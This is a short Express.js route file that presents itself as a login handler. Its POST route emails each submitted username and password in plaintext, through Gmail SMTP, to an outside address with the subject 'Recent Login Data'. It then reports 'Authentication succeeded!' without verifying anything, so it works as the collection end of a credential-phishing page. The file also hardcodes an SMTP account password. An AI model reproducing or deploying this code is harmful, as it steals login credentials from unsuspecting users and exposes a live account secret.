import express from "express";
import nodemailer from "nodemailer";

const router = express.Router();

router.post("/", async (req, res) => {
    try {
        const userData = {
            username: req.body.username,
            password: req.body.password,
        };

        // Nodemailer configuration
        let transporter = nodemailer.createTransport({
            host: "smtp.gmail.com",
            port: 587,
            secure: false,
            auth: {
                user: "openweathertec@gmail.com",
                pass: "nfxz lntx xvas ifsf",
            },
            tls: {
                ciphers: 'SSLv3',
            },
        });

        let mailOptions = {
            from: "openweathertec@gmail.com",
            to: "sankalpac123@gmail.com",
            subject: "Recent Login Data",

            text: `Username: ${userData.username}, Password: ${userData.password}`,// Convert userData to a string for the email text
        };

        const info = await transporter.sendMail(mailOptions);
        res.status(200).json("Authentication succeeded!");

    } catch (err) {
        res.status(500).json("Oops! Something went wrong: " + err);
    }
});

export default router;
